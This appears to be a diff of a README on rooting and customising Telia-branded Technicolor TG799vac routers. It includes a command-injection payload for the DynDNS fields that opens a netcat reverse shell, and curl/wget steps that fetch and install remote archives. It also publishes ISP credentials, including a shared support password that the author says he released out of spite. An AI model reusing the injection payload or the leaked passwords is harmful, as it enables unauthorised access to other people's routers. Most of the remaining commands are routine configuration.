@@ -13,13 +13,16 @@ It is possible to get root access on 17.2.405 version if you are using a MiTM at
 If you have root access (telia still sending out devices with version 17.03) so the first thing you really must do is to edit the dropbear file on bank 2, otherwise you will be locked out when they pushing the firmware to 17.04 and then you are pretty lost unless you know how you can setup a MGMT network and gain root access this way. 
 
 Also for disable  so your router wont get upgraded you can type below command ASAP you have connected to shell:
-     
+ 
+```sh
      uci set cwmpd.cwmpd_config.state=0
      uci commit
      rm /etc/cwmp*     
+```
 
 #### For get all info and settings from your device (Thanks to [@LuKePicci](https://github.com/LuKePicci) for this as well)
 
+```sh
      clash
      root> get InternetGatewayDevice.
      InternetGatewayDevice.LANDeviceNumberOfEntries [unsignedInt] = 2
@@ -75,20 +78,22 @@ Also for disable  so your router wont get upgraded you can type below command AS
      InternetGatewayDevice.Services.X_000E50_ngwfdd.Enable [boolean] = 0
      InternetGatewayDevice.Services.X_000E50_Internet.WANConnection [string] = 
      InternetGatewayDevice.Services.X_000E50_ngwfdd.BaseURL [string] = https://telia:ZDgFbBH5jQvUocL7@telia-gw.tgwfd.org:8443/
-          InternetGatewayDevice.Services.X_000E50_ngwfdd.Tag [string] = TeliaFT
-  
-  ...... and some extremely much more stuff will be printed..
-     
+     InternetGatewayDevice.Services.X_000E50_ngwfdd.Tag [string] = TeliaFT
+    ........ 
+ ```    
     
      Once type above command, wait for few seconds and you wil dump entire settings for your device.
 
 Get CSFR token via cli: 
- 
+ ```sh
      curl -sL http://192.168.1.1/login.lp?action=getcsrf
-     
+```
+
 Get CSFR token via developer console: 
 
+```js
      $("meta[name=CSRFtoken]").attr("content")
+```
 
 #### Notice: This wiki is for firmwares <17.2.0405. For get root access on 17.2.0405 you must downgrade your firmware via TFTP flashing and then you can follow this wiki, more info about how to downgrade your firmware can be found on this awesome [wiki](https://hack-technicolor.readthedocs.io/en/stable/) - Thanks to all who contribute, you know who you are - _If you leeching the firmwares, then seed 24/7 for help others_
 
@@ -119,16 +124,20 @@ Get CSFR token via developer console:
 #### Telia - VDNT-O firmwares can be downloaded from:
 
 Commands must be executed on the router: 
-
+```sh
     wget http://131.116.22.230:80/172339o1901024closed.rbi
     wget http://131.116.22.230:80/1720405o1901012closed.rbi
+```
 
 For upgrade firmware, you just have to type:
 
+```sh
     sysupgrade --safe -o 172339o1901024closed.rbi
-    
+```
+
  #### Get access to all cards on latest firmware:
- 
+
+```sh 
     uci add_list web.uidefault.upgradefw_role=admin
     uci add_list web.usr_assist.role=admin
     uci add_list web.assistancemodal.roles=admin
@@ -145,12 +154,11 @@ For upgrade firmware, you just have to type:
     uci add_list web.ltesms.roles=admin
     /etc/init.d/nginx restart
     sed -i 's/0/1/g' /etc/config/dropbear; sed -i 's/61122/22/g' /etc/config/dropbear; /etc/init.d/dropbear restart
-    
+```
+
 ##### Bonus from 2019-10-29. Since I have been blacklisted by Telia from getting new routers for free and they force me to pay full price if I want a new router I decided to share their secret password in plain-text. Telia's default password in plain-text is: '_T3L1a!SuPPor7' for all Technicolor routers - Enjoy!
 
 #### If you want me host more firmwares just setup a FTP or something so I can leech them and I will host them for you, send an e-mail with info to wuseman@nr1.nu
-
-
      
 # README
 
@@ -188,11 +196,15 @@ For upgrade firmware, you just have to type:
 
 #### Let's begin. Fire up a terminal of any kind and just run the awesome netcat tool and listen on a port:
 
+```sh
     nc -lvvp [machine_port]
+```
 
 #### Go to the WAN Services and press SHOW ADVANCED. In username, password and domain field you need type the below command, after this is done just enable the dyndns. It wont matter wich hoster you choose just pick one, press save and just wait 4-5 seconds and you have just got full root access of your TG799VAC Xtreme 17.2 Mint, check preview video above if you do not understand.
 
+```sh
     :::::::`nc [machine_IP] [machine_port] -e /bin/sh`
+```
 
 ##### You will see something similiar and if you see this then you got root access, type ls / for example:
 
@@ -201,6 +213,7 @@ For upgrade firmware, you just have to type:
 
 #### Let us now allow SSH permanent, copy paste commands below:
 
+```sh
     rm /etc/dropbear/*
     uci delete dropbear.mgmt &> /dev/null
     uci delete dropbear.mgmt.PasswordAuth &> /dev/null
@@ -241,12 +254,14 @@ For upgrade firmware, you just have to type:
     uci set web.uidefault.upgradefw_role='admin'
     /etc/init.d/dropbear restart; uci commit; exit
     ssh root@192.168.1.1 "tee -a /etc/dropbear/authorized_keys" < ~/.ssh/id_rsa.pub; ssh root@192.168.1.1
+```
 
 #### When things gets broken for real as for example there is no space left and you can't even use rm -rf command then mtd will save you, run below command for a full factory reset:
 
 ![Screenshot](files/erase-rootfs.gif)
-
+```sh
     mtd -r erase rootfs_data
+```
 
 #### If WEBGUI ever will get broken cause you fucked it up then reset router with 'rtfd --all (same as press on reset button)'. If you want to keep files and just reset settings then use 'rtfd --soft' instead.
 
@@ -262,7 +277,9 @@ For upgrade firmware, you just have to type:
 
 #### When you have root access on your router you will be able to unlock rootfs_data and install a very powerful gui vs original from Telia thanks to Ansuel and other awesoem developers by below command:
 
+```sh
     curl -k https://repository.ilpuntotecnico.com/files/Ansuel/AGTEF/GUI.tar.bz2 --output /tmp/GUI.tar.bz2; bzcat /tmp/GUI.tar.bz2 | tar -C / -xvf -; /etc/init.d/rootdevice force; reboot
+```
 
 ##### Now go visit http://192.168.1.1 and you will see a brand new GUI interface. Default login: username: admin - password:admin
 
@@ -286,19 +303,20 @@ For upgrade firmware, you just have to type:
 
 ![Screenshot](files/wusemans_pwnS-100-percent-complete-hacking.png)
 
-##### Do you look forward to upgrade your firmware without any third party software or without any backdoors from your internet provider? Great, i will show you how you will do this easier then ever..
+Do you look forward to upgrade your firmware without any third party software or without any backdoors from your internet provider? Great, i will show you how you will do this easier then ever..
 
 #### Add Administrator user to be allowed to upgrade firmwware:
-
+```sh
     uci add_list web.uidefault.upgradefw_role='admin'
     uci commit
-
+```
 #### If you will try below command you will know how it feels to work for telia a support: ;)
 
 ![Screenshot](files/wuseman.pwned.telia.png)
-
+```sh
     uci set web.usr_Administrator.role='superuser'
     uci set web.usr_Administrator.role='telia'
+```
 
 ![Screenshot](files/upgrade_firmware.png)
 
@@ -309,7 +327,7 @@ For upgrade firmware, you just have to type:
 #### Add a new user with clash:
 
 ![screenshot](files/clash-adduser.gif)
-
+```sh
     clash newsrpuser -u <wuseman> -p <password>
 
      uci set web_back.usr_wuseman.srp_salt='D0124225'
@@ -327,31 +345,36 @@ For upgrade firmware, you just have to type:
      option srp_verifier 'A955EDB6ECAC0536BA69F9D1F1C7F3D9F8A02FDF29170D4A8506A14F7E6F752FF845DACE10E6B3C66C15EAAB53896E41D541C22F32E9E0E8D60A1D7F1D187604BE8A5653B5CDF327542E8DBE5C8481E40C70BD0506448695F7E85338D4427187A49CF799CDDDD2DB3E6D652A25830C42024EB9A682ED5C27E36B159DB7617F41FF6ED5EF58163AC2C68AC26B3D57749AF3AFEF6352950D79A410150E27CE984EA375613737A235B5E28D006C5CE69DE40B651020505AEB7CE5986829D79B9E0375F5127F090CD400B2A2D06385F9931071415042979C8ED80D328BA4810A1692E263733DA9D85DC7E762859145A0D6A607447FCF4FFD53D144D8E018D4F345C9'
      option srp_salt 'D0124225'
      " >> /etc/config/web
+```
 
 #### Create a user for minitrr064d
-
-    computeHA1 -u <username> -p <password> -r
+```sh
+     computeHA1 -u <username> -p <password> -r
      Self test passed - HA1 computation reliable
      Self test passed - authentication check reliable
 
      Computing hash for <username>:minitr064d:<password>
      dba1af121349128daf864727a33b1614
-     
+```
 ### OPENVPN Client
 
 ##### Install Required Packages:
 
-     opkg update; opkg install openvpn-openssl openssl-util
-
+```sh
+     opkg update; 
+     opkg install openvpn-openssl openssl-util
+```
 ##### Configs - Network:
 
+```sh
     uci set network.vpnclient="interface"
     uci set network.vpnclient.ifname="tun0"
     uci set network.vpnclient.proto="none"
     uci commit network;service network restart
-    
+```
 ##### Configs - Firewall:
 
+```sh
      uci add firewall zone
      uci set firewall.@zone[-1].name="<vpn_client>"
      uci add_list firewall.@zone[-1].network="<vpn_client>"
@@ -364,39 +387,43 @@ For upgrade firmware, you just have to type:
      uci set firewall.@forwarding[-1].src="lan"
      uci set firewall.@forwarding[-1].dest="<vpn_client>"
      uci commit firewall; service firewall restart
-     
+```
 #### Setup openvpn client:
 
+```sh
      uci set openvpn.vpnclient="openvpn"
      uci set openvpn.vpnclient.enabled="1"
      uci set openvpn.vpnclient.config="/etc/openvpn/vpnclient.ovpn"
      uci commit openvpn;service openvpn restart
-
+```
 #### OPKG
 
 ##### With below setting you will be allowed to install packages from more repos:
 
+```sh
+cat << "EOF" > /etc/opkg.conf 
+arch all 100
+arch brcm63xx 200
+arch brcm63xx-tch 300
+EOF
+```
 
-     echo "
-      arch all 100
-      arch brcm63xx 200
-      arch brcm63xx-tch 300
-     " > /etc/opkg.conf 
-
-    echo  "
-        src/gz chaos_calmer http://archive.openwrt.org/chaos_calmer/15.05.1/brcm63xx/smp/packages/base
-        src/gz luci http://archive.openwrt.org/chaos_calmer/15.05.1/brcm63xx/smp/packages/luci
-        src/gz management http://archive.openwrt.org/chaos_calmer/15.05.1/brcm63xx/smp/packages/management
-        src/gz routing http://archive.openwrt.org/chaos_calmer/15.05.1/brcm63xx/smp/packages/routing
-        src/gz packages http://archive.openwrt.org/chaos_calmer/15.05.1/brcm63xx/smp/packages/packages
-        src/gz telephony http://archive.openwrt.org/chaos_calmer/15.05.1/brcm63xx/smp/packages/telephony
-     " > /etc/opkg/distfeeds.conf
-
+```sh
+cat << "EOF" >> /etc/opkg/distfeeds.conf
+src/gz chaos_calmer http://archive.openwrt.org/chaos_calmer/15.05.1/brcm63xx/smp/packages/base
+src/gz luci http://archive.openwrt.org/chaos_calmer/15.05.1/brcm63xx/smp/packages/luci
+src/gz management http://archive.openwrt.org/chaos_calmer/15.05.1/brcm63xx/smp/packages/management
+src/gz routing http://archive.openwrt.org/chaos_calmer/15.05.1/brcm63xx/smp/packages/routing
+src/gz packages http://archive.openwrt.org/chaos_calmer/15.05.1/brcm63xx/smp/packages/packages
+src/gz telephony http://archive.openwrt.org/chaos_calmer/15.05.1/brcm63xx/smp/packages/telephony
+EOF
+```
 #### Enable TFTP and flash your device with TFTP:
 
     Set tftp enable 
+```sh
       uci set dhcp.dnsmasq.enable_tftp='1'
-
+```
     Switch device power off (or pull the power cord).
     Connect a client to the device via Ethernet to LAN1
     Trigger the rescue function by pressing and holding the reset button of the device and then turning the device on (or plug in the power cord).
@@ -407,30 +434,24 @@ For upgrade firmware, you just have to type:
 #### Setup a TFTP server on your Gentoo Linux pc:
 
     Install atftpd: 
+```sh
      emerge --sync; emerge -a atftpd
-
-    Create tftp dir:
      mkdir /mnt/tftp
- 
-    Copy firmware to our new tftp dir:
      cp <firmware.bin> /mnt/tftp/
-    
-    Change the ownership of the folder and the file in it:
      chown nobody:nogroup -R /mnt/tftp
-
-    Setup configuration for our new dir:
+```
+```sh
      echo 'TFTPD_ROOT="/mnt/tftp"
            TFTPD_OPTS="--daemon --user nobody --group nobody' > /etc/conf.d/atftp
- 
-    Run TFTP server
      /etc/init.d/atftpd start
-
+```
 
     Thats it, now use getent to confirm it is up and running:
+```sh
       getent services tftp
-
+```
 #### Use TFTP to push firmware to tg799vac router:
-
+```sh
     First you need to setup a static ip to be able to communicate with router:
      ifconfig eth0 192.168.1.2 netmask 255.255.255.0 up 
      route add default gw 192.168.1.1
@@ -438,84 +459,81 @@ For upgrade firmware, you just have to type:
 
     Use wireshark for listen on BOOTP message, when tg799 router reporting BOOTP then run below command: 
     atftp --trace --option "timeout 1" --option "mode octet" --put --local-file tg799bin.firmware.rbi <ip-addr/hostname>
-
-#### Remove all phone settings:
-
-      phonesettings="$(uci show mmpbx|wc -l)";phoneshit="$(uci show mmpbx | cut -d= -f1)";for z in $phoneshit; do uci delete $z &> /dev/null; done ;echo "Removed $phonesettings useless settings for your router"'
-      
-      Removed 777 useless settings for your router' 
-
-
-#### Remove all iptv settings:
-
-     iptv="$(uci show | grep iptv | cut -d= -f1)"; for iptvcrap in $iptv; do uci delete $iptvcrap &> /dev/null; done; uci show |grep iptv; echo "Ups, no settings for iptv has been set"
-
+```
 #### Got stuck with some packages that says error opening terminal? No worries - This is caused cause colors - Run below command to fix the xterm problem:
 
 ![Screenshot](files/install-opkg-packages.gif)
-   
+```sh
     export TERM=linux
     export TERMINFO=/etc/terminfo
-
+```
 #### Run uci-whois.sh from scripts dir to whois all ip's that your isp added for various settings:
 
 ![Screenshot](files/whois.gif)
 
 #### Mount root as read and write:
-
+```sh
     mount -o remount,rw /
-
+```
 ##### If you are lazy and want things sorted as i do, then run below command:
 
 ![Screenshot](files/sorted-dirs.gif)
-
+```sh
     mkdir uci_settings; cd uci_settings;
     for settings in $(uci show | awk -F. '{print $1}' | uniq);do uci show $settings > $settings;done
-
+```
 
 #### List product, serial, ssid prefix etc;
+```sh
+cat /var/hostapd.env 
+_COMPANY_NAME=Technicolor
+_PROD_NAME=MediaAccess TG
+_PROD_NUMBER=Telia WiFi-router Plus
+_PROD_FRIENDLY_NAME=Telia WiFi-router Plus
+_VARIANT_FRIENDLY_NAME=TG799TSvac Xtream
+_SSID_SERIAL_PREFIX=TNCAP
+_BOARD_NAME=VANT-W
+_BOARD_SERIAL_NBR=1652TAGSU
+_PROD_SERIAL_NBR=CP1652TAGSU
+_MACADDR=10-13-31-1D-AA-3A
+_WL_MACADDR=10-13-31-1D-AA-3B
 
-    cat /var/hostapd.env | sed 's/^_//g' | sed 's/=/ ===> /g'
-      COMPANY_NAME ===> Technicolor
-      PROD_NAME ===> MediaAccess TG
-      PROD_NUMBER ===> Telia WiFi-router Plus v3
-      PROD_FRIENDLY_NAME ===> Telia WiFi-router Plus v3
-      VARIANT_FRIENDLY_NAME ===> TG799TSvac Xtream
-      SSID_SERIAL_PREFIX ===> TNCAP
-      BOARD_NAME ===> VBNT-H
-      BOARD_SERIAL_NBR ===> SECRET
-      PROD_SERIAL_NBR ===> SECRET
-      MACADDR ===> E0-B9-15-23-22-54
-       WL_MACADDR ===> E0-B9-15-23-45-55
+```
 
 #### List all files where "password=" is readable:
 
-    sudo grep -rP -w -e 'password=' .| grep -v Binary | grep -v ddns
+```sh
+    sudo grep -rP -w -e 'password=' .| grep -Ev 'Binary|ddns'
+```
 
 #### List all files where you can find your serial:
-
+```sh
     find . -type f | xargs grep -e 'SERIAL' | cut -d':' -f1 | grep / | uniq
+```
 
-#### Some guys on openwrt forum claims that your webgui will be faster if you change some power settings (DO IT ON YOUR OWN RISK I HAVENT TRIED):
+#### Some guys on openwrt forum claims that your webgui will be faster if you change some power settings:
 
+```sh
     pwrctl config --cpuspeed 0
     pwrctl config --wait off
     pwrctl config --ethapd off
     pwrctl config --eee off
     pwrctl config --autogreeen off
-
+```
 #### Change telia to admin in all lp files:
 
 ![Screenshot](files/beforeandafter.png)
 
+```sh
     sed -i 's/telia/admin/' /www/docroot/modals/gateway-modal.lp
     sed -i 's/telia/admin/' /www/docroot/modals/internet-modal.lp
     sed -i 's/telia/admin/' /www/docroot/modals/mmpbx-global-modal.lp
-
+```
 #### For users that miss vpn card in webgui, run below command (if this modal is missing then its under modals dir in this repo)
 
 ![Screenshot](files/vpn-in-webgui.png)
 
+```sh
     cp /rom/www/docroot/modals/l2tp-ipsec-server-modal.lp /www/docroot/modals/
 
     cat >> /etc/config/web
@@ -525,11 +543,11 @@ For upgrade firmware, you just have to type:
     option target '/modals/l2tp-ipsec-server-modal.lp'
     list roles 'admin'
     list roles 'engineer'
-
+```
 #### Setup your dns provider from commandline:
 
-    echo "
-
+```sh
+cat << "EOF"  > /etc/config/ddns 
     config service 'myddns_ipv4'
     option interface 'wan'
     option ip_source 'network'
@@ -543,69 +561,30 @@ For upgrade firmware, you just have to type:
     option username 'domain.com'
     option service_name 'loopia.se'
     option lookup_host 'domain.com'
-    option domain 'domain.com'" > /etc/config/ddns
-    
-#### Setup local hostnames:
-
-    cat >> /etc/config/dhcp
-
-    config host
-    option name 'moms.ipad'
-    option mac 'macaddr'
-    option ip 'prefered.localip''
-
-    config host
-    option name 'dads.linux.laptop'
-    option mac 'macaddr'
-    option ip 'prefered.localip'
-
-#### Give a device on your localnetwork a custom hostname:
-
-##### Example 1 - Echo method
-
-    echo " /etc/config/dhcp
-
-    # WUSEMAN WAS HERE
-    # EDITED: 2018-08-14
-
-    config host
-    option name 'moms-ipad'
-    option mac 'macaddr'
-    option ip 'preferedip'" >> /etc/config/dhcp
-
-##### Example 2 - UCI method.
-
-    uci set dhcp.@host[0]=host
-    uci set dhcp.@host[0].name='moms-ipad'
-    uci set dhcp.@host[0].mac='macaddr'
-    uci set dhcp.@host[0].ip='preferedip'
-    uci set dhcp.@host[1]=host
-    uci set dhcp.@host[1].name='dadslaptop'
-    uci set dhcp.@host[1].mac='macaddr'
-    uci set dhcp.@host[1].ip='preferedip'
+    option domain 'domain.com'"
+EOF
+ ```   
 
 #### Setup domain names:
 
 ##### Example 1 - Echo method
-
+```sh
     echo "
     config domain
     option name 'github'
     option ip '192.30.253.112'" >> /etc/config/dhcp
-
+```
 ##### Example 2 - UCI method
-
+```sh
     uci set dhcp.@domain[1]=domain
     uci set dhcp.@domain[1].name='github'
     uci set dhcp.@domain[1].ip='192.30.253.112'
-
+```
 #### Portforwarding
 
 ##### Example 1 - Echo method
-
-    echo "
-    # WUSEMAN WAS HERE
-    # EDITED: 2018-08-14
+```sh
+cat << "EOF" > /etc/config/firewall
 
     config userredirect 'userredirectXXDD'
     option dest_port '<PORTNUMBER>'
@@ -617,10 +596,13 @@ For upgrade firmware, you just have to type:
     option src_dport '<PORTNUMBER>'
     option family '<ipv4>/<ipv6>'
     option target 'DNAT'
-    option dest_ip '<lanip>'" >> /etc/config/firewall
+    option dest_ip '<lanip>'"
+EOF
+```
 
 ##### Example 2 - UCI method
 
+```sh
     uci set firewall.userredirect4320=userredirect
     uci set firewall.userredirect4320.family='<ipv4/ipv6>'
     uci set firewall.userredirect4320.enabled='<1>'
@@ -633,9 +615,10 @@ For upgrade firmware, you just have to type:
     uci set firewall.userredirect4320.dest_ip='<0.0.0.0>' # use 0.0.0.0 if you dont use static leases
     uci set firewall.userredirect4320.dest_mac='<macaddr>'
     uci set firewall.userredirect4320.proto='tcp' '<tcp/udp>'
-
+```
 #### Disable UPNP:
 
+```sh
     uci set minitr064d.config=minitr064d
     uci set minitr064d.config.enable_upnp='0'
     uci set minitr064d.config.log_output='0'
@@ -645,12 +628,14 @@ For upgrade firmware, you just have to type:
     uci set minitr064d.config.model_url=''
     uci set minitr064d.config.model_description='main router'
     uci set minitr064d.config.model_number='tg799vac xtream router'
-    uci set minitr064d.config.friendly_name='tg799vac xtream router
+    uci set minitr064d.config.friendly_name='tg799vac xtream router'
     uci set minitr064d.config.manufacturer_name='tg799vac xtream router'
     uci set minitr064d.config.model_name='technicolor'
+```
 
 #### Environment settings:
 
+```sh
     uci set env.var.aria2_webui='0'
     uci set env.var.luci_webui='0'
     uci set env.var.transmission_webui='0'
@@ -658,11 +643,12 @@ For upgrade firmware, you just have to type:
     uci set env.var.blacklist_app='0'
     uci set env.var.new_ver='only god knows'
     uci set env.rip.sfp='1'
+```
 
 ##### List all URLs for your firmware that can be downloaded (wont work on telias firmware. Did you found the key? Please contact me then):
 
+```sh
     strings /etc/cwmpd.db
-
     SQLite format 3
     tabletidkvtidkv
     CREATE TABLE tidkv (  type TEXT NOT NULL,  id TEXT NOT NULL,  key TEXT NOT NULL,  value TEXT,  PRIMARY KEY (type, id, key)))
@@ -692,70 +678,90 @@ For upgrade firmware, you just have to type:
     transfera Stateb7
     transfera StartTimed
     transfera PasswordV
+```
 
 #### List network devices:
 
+```sh
     awk '{print $1}' /proc/net/dev
+```
 
 #### To get a fresh network configuration on your client system you can remove all IP addresses via:
- 
+
+```sh
       ip a flush dev <device>
+```
 
 #### Changing max sync speed on your modem:
 
+```sh
     uci set xdsl.dsl0.maxaggrdatarate='200000' # 16000 default
     uci set xdsl.dsl0.maxdsdatarate='140000'   # 11000 default
     uci set xdsl.dsl0.maxusdatarate='60000'    # 40000 default
-
+```
 #### Enable or Disable dnsmasq:
 
+```sh
     uci show dhcp.lan.ignore='1'
-
+```
 #### Enable or Disable network time server:
 
+```sh
     uci set system.ntp.enable_server='1'
+```
 
 #### Check the current running dns with:
 
+```sh
     cat /etc/resolv.conf
-
+```
 #### Edit nsplink to something else (where you get redirected when you click on the logo at top)
 
+```sh
     uci set web.uidefault.nsplink='https://sendit.nu'
-
+```
 #### This will show all traffic on your router with netstat:
 
+```sh
     netstat -tulnp
-
+```
 #### This will show all ip numbers connected to your router atm..
 
+```sh
     netstat -lantp | grep ESTABLISHED |awk '{print $5}' | awk -F: '{print $1}' | sort -u
-
+```
 #### Capture traffic on all interfaces (add -i wl0 for include wifi):
 
+```sh
     tcpdump -vvv -ttt -p -U
     tcpdump -i wl0 -vvv -ttt -p -U
-
+```
 #### Enable or Disable Content Sharing (Samba / DNLA)
 
+```sh
     uci set samba.samba.enabled='1'
+   
     uci set dlnad.config.enabled='1'
 
+```
 #### Take control over mwan:
 
+```sh
     uci set mwan.remoteassist=rule
     uci set mwan.remoteassist.dest_ip='192.168.1.0/24'
     uci set mwan.remoteassist.policy=''
-
+```
 #### To view currently dhcp leases:
 
+```sh
     cat /tmp/dhcp.leases
-    1534969000 macaddr lanip machine macaddr
+```
 
 #### To view all ipv4 adresses from uci settings:
 
+```sh
     uci show | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"
-
+```
 #### Print CPU info with clash:
 
     clash showinfo cpu
@@ -780,37 +786,33 @@ For upgrade firmware, you just have to type:
 
 ##### Enable or Disable GUI:
 
+```sh
     uci set web.remote.active='1'
-
-##### List ARP log:
-
-    cat /tmp/arp.log
-    IP address     HW type    Flags     HW address      Mask    Device
-    lanip      0x1     0x2     X0:X0:X0:X0:X0:X0    *    br-lan
-    mgmt_ip     0x1     0x2     X0:X0:X0:X0:X0:X0    *    vlan_mgmt
-    wanip      0x1     0x2     X0:X0:X0:X0:X0:X0    *    eth4
+```
 
 ##### List all interfaces mac-addr:
 
+```sh
     ifconfig -a  | sed '/eth\|wl/!d;s/ Link.*HWaddr//'
-    eth0    X0:X0:X0:X0:X0:X0
-    eth1    X0:X0:X0:X0:X0:X0
-    eth2    X0:X0:X0:X0:X0:X0
-    eth3    X0:X0:X0:X0:X0:X0
-    eth4    X0:X0:X0:X0:X0:X0
-    eth5    X0:X0:X0:X0:X0:X0
+    eth0      X0:X0:X0:X0:X0:X0
+    eth1      X0:X0:X0:X0:X0:X0
+    eth2      X0:X0:X0:X0:X0:X0
+    eth3      X0:X0:X0:X0:X0:X0
+    eth4      X0:X0:X0:X0:X0:X0
+    eth5      X0:X0:X0:X0:X0:X0
     vlan_eth0 X0:X0:X0:X0:X0:X0
     vlan_eth1 X0:X0:X0:X0:X0:X0
     vlan_eth2 X0:X0:X0:X0:X0:X0
     vlan_eth3 X0:X0:X0:X0:X0:X0
     vlan_eth5 X0:X0:X0:X0:X0:X0
-    wl0     X0:X0:X0:X0:X0:X0
-    wl0_1    X0:X0:X0:X0:X0:X0
-    wl0_2    X0:X0:X0:X0:X0:X0
-
+    wl0       X0:X0:X0:X0:X0:X0
+    wl0_1     X0:X0:X0:X0:X0:X0
+    wl0_2     X0:X0:X0:X0:X0:X0
+```
 
 #### Various settings:
 
+```sh
     uci set dlnad.config.friendly_name='tg799vac xtream router'
     uci set dlnad.config.model_name='tg799vac xtream router'
     uci set dlnad.config.manufacturer_url=''
@@ -823,9 +825,11 @@ For upgrade firmware, you just have to type:
     uci set env.var.prod_number='tg799vac xtream router'
     uci set env.var.isp='telia'
     uci set mmdetectslic.non_voice_var.company_name='technicolor'
+```
 
 ##### Remove trafficmon settings:
 
+```sh
     uci delete system.@trafficmon[0].interface=''
     uci delete system.@trafficmon[0].minute=''
     uci delete system.@trafficmon[1].interface=''
@@ -839,9 +843,10 @@ For upgrade firmware, you just have to type:
     uci delete web.ruleset_main.rules='gateway'
     uci delete web.trafficmonitor.target='/modals/traffic-monitor.lp'
     uci delete web.trafficmonitor.roles='admin'
-
+```
 ##### Send syslog to your own server instead of sending * to Telia (it's insane that they want all stuff they filtering as default)
 
+```sh
     uci set ledfw.syslog=syslog
     uci set ledfw.syslog.trace='6'
     uci set mmpbx.syslog=syslog
@@ -867,34 +872,39 @@ For upgrade firmware, you just have to type:
     uci set osgi.config.enable_syslog='1'
     uci set siege.log.enable_syslog='1'
     uci del_list web_back.syslogmodal.roles='telia'
-
+```
 #### Grab all filters from log.txt when you export this from diagnostic tab and then insert the lines in /etc/config/system to log everything on your syslog server:
 
+```sh
     cat log.txt  | awk '{print $7}' | sed 's/://g' | uniq -d | sort -r | uniq | sed 's/^/        list log_filter "/g' | sed 's/$/"/g'|sed "s/\"/'/g"
-
+```
 ##### Settings for syslog
 
-    cat << "EOF" > /etc/config/system
+```sh
+cat << "EOF" > /etc/config/system
 
     config system
         option log_port '514'
-        option log_filter_ip ''
-        option hostname 'OpenWrt'
+        option log_filter_ip '<syslog_server>'
+        
+        option hostname 'router'
         option zonename 'Europe/Stockholm'
         option timezone 'CET-1CEST,M3.5.0,M10.5.0/3'
+
         option network_timezone '1'
         option hw_reboot_count '0'
         option sw_reboot_count '0'
         option cronloglevel '5'
-        list log_filter 'Everything'
+
         list log_filter 'Everything'
         list log_filter 'warmboot'
+        list log_filter 'cwmp'
         list log_filter 'cwmpd'
         list log_filter 'Critical'
         list log_filter 'Zonewatcher'
         list log_filter 'wifiinfo'
+        list log_filter 'wifi'
         list log_filter 'mmpbxd'
-        list log_filter 'Everything'
         list log_filter 'transformer'
         list log_filter 'Zonewatcher'
         list log_filter 'zoneredird'
@@ -907,6 +917,12 @@ For upgrade firmware, you just have to type:
         list log_filter 'nginx'
         list log_filter 'kernel'
         list log_filter 'ipks'
+        list log_filter 'ipk'
+        list log_filter 'root'
+        list log_filter 'user'
+        list log_filter 'mwan'
+        list log_filter 'lan'
+        list log_filter 'vlan'
         list log_filter 'opkg'
         list log_filter 'hostmanager'
         list log_filter 'hostapd'
@@ -922,8 +938,6 @@ For upgrade firmware, you just have to type:
         list log_filter 'bash'
         list log_filter 'sh'
         list log_filter 'clash'
-        list log_filter 'root'
-        list log_filter 'mwan'
         list log_filter 'user.notice'
         list log_filter 'auth'
         list log_filter 'pppoe-relay-hotplug'
@@ -931,26 +945,47 @@ For upgrade firmware, you just have to type:
         list log_filter 'ipsec_starter'
         list log_filter 'ipsec'
         list log_filter 'insmod'
+        list log_filter 'modprobe'
+        list log_filter 'rmmod'
+        list log_filter 'vpn'
+        list log_filter 'openvpn'
         list log_filter 'netifd'
         list log_filter 'wansensing'
         list log_filter 'miniupnpd'
         list log_filter 'user.info'
         list log_filter 'guest'
-        list log_filter 'cwmp'
-
+        list log_filter 'wget'
+        list log_filter 'curl'
+        list log_filter 'ssh'
+        list log_filter 'sshd'
+        list log_filter 'telnet'
+        list log_filter 'http'
+        list log_filter 'https'
+        list log_filter 'ftp'
+        list log_filter 'ftpd'
+        list log_filter 'uci'
 
     config timeserver 'ntp'
         option enable_server '1'
+        option program '/sbin/firstusedate'
         list server 'ntp1.rgw.telia.se'
         list server 'ntp2.rgw.telia.se'
+        list server '0.se.pool.ntp.org'
+        list server '1.se.pool.ntp.org'
+        list server '2.se.pool.ntp.org'
+        list server '3.se.pool.ntp.org'
+        list server 'time.google.com'
+        list server 'time1.google.com'
+        list server 'time2.google.com'
+        list server 'time3.google.com'
+        list server 'time4.google.com'
 
-    config time 'time'
-
-    config config 'config'
-        option export_plaintext '1'
-        option export_unsigned '1'
-        option import_plaintext '1'
-        option import_unsigned '1'
+    config config config
+         option export_plaintext  1
+         option export_unsigned   1
+         option import_plaintext  1
+         option import_unsigned   1
+         option usb_filesystem_charset 'utf8'
 
     config coredump
         option path '/root'
@@ -978,7 +1013,17 @@ For upgrade firmware, you just have to type:
         option minute '*/720'
         option sw_reboot_count '0'
 
-    EOF
+    config time 'time'
+EOF
+```
+
+
+#### Restart system init after you edited the system file
+
+```sh
+    /etc/init.d/system restart
+```
+
 
 #### On your syslog server then put this in /etc/syslog/syslog.conf to recieve all messages from your tg799 xtream router.
 
@@ -1091,61 +1136,76 @@ For upgrade firmware, you just have to type:
 
 ##### Now restart system on your router and you should see * messages:
 
+```sh
      /etc/init.d/system restart
+```
 
 ##### Enable or Disable Time of Day ACL rules:
 
+```sh
     uci set tod.global.enabled='0'
+```
 
 ##### For login with debug mode enabled, then please go to (Proably not possible but it is to try):
 
+```sh
     http://192.168.1.1/?debug=1
+```
 
 ##### Enable or Disable so your router wont restart if there is an segmentation fault in a user space program:
 
+```sh
     uci set system.@coredump[0].reboot='0'
     uci commit system
+```
 
 #### Just type below command for print the accesskey:
 
+```sh
     sed -e 's/^\(.\{8\}\).*/\1/' /proc/rip/0124
+```
 
 #### You can check the current running dns with
-
+```sh
     cat /etc/resolv.conf
+```
 
 ##### Enable or Disable Content Sharing (Samba / DNLA):
-
+```sh
     uci set samba.samba.enabled='1'
     uci set dlnad.config.enabled='1'
+```
 
 ##### To view currently dhcp leases:
-
+```sh
     cat /tmp/dhcp.leases
     1534969000 macaddr lanip machine macaddr
+```
 
 #### Disable Time of Day ACL rules
-
+```sh
     uci set tod.global.enabled='0'
+```
 
 #### To disable mobile card since there is no button, execute: 
 
+```sh
     uci set mobiled.device_defaults.enabled=0
     uci commit
+```
 
 #### List installed packages:
 
-    echo $(opkg list_installed | awk '{ print $1 }')
-
-#### List installed packages in a tree:
-
-    echo $(opkg list_installed | awk '{ print $1 }') | xargs -n 1
+```sh
+    opkg list_installed 
+```
 
 #### IT IS VERY IMPORTANT TO ADD BELOW COMMANDS IN SAME ORDER I LISTED THEM.
